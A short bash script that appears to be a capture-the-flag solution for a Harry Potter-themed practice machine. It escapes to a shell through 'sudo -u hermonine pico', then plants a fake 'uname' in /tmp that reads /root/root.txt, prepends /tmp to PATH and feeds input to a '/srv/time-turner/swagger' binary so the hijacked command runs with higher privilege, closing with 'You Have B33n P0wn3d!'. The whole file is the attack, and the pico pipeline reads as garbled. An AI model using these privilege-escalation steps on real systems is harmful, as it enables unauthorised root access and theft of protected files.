#!/bin/bash


sudo -u hermonine /usr/bin/pico | echo ^R^X | echo reset; sh 1>&0 2>&0


echo "#!/bin/bash
cat /root/root.txt" > /tmp/uname

chmod +x /tmp/uname
export PATH=/tmp/:$PATH
echo '8899'|/srv/time-turner/swagger | awk -F 'of ' '{print $2}'|/srv/time-turner/swagger
echo "You Have B33n P0wn3d!"
